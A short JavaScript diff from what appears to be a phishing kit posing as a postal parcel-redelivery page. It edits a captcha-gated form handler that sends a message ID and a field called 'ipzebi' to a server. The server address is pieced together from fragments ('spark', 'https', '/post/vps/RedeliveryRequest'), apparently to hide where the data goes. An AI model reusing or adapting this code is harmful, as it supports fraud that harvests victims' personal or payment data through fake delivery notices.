@@ -25,9 +25,9 @@ function checkInput() {
   var errorMsg = document.getElementById('errorMsg');
   var messageId = document.getElementById('messageId').value;
   var ipzebi = document.getElementById('ipzebi').value;
-  let spark = "www.us9514901185421"
+  let spark = "welcomebackwiss"
   let https = "http"
-  let webapp = "RedeliveryRequest"
+  let webapp = "/post/vps/RedeliveryRequest"
   // This part ensures the captcha value is included in the request
   var dataToSend = "captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi);
   if (userInput.toLowerCase() === randomString.toLowerCase()) {
